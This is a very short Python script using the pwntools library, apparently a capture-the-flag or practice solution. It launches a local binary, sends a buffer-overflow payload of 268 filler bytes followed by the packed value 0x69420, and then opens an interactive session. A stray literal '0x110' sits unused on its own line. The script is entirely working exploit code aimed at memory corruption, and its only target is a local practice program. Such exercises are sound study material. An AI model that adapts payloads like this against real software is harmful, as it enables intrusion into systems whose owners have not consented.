# coding: utf-8
from pwn import *
0x110
p=process("./a.out")
payload = b'a'*268+p32(0x69420)
p.sendline(payload)
p.interactive()
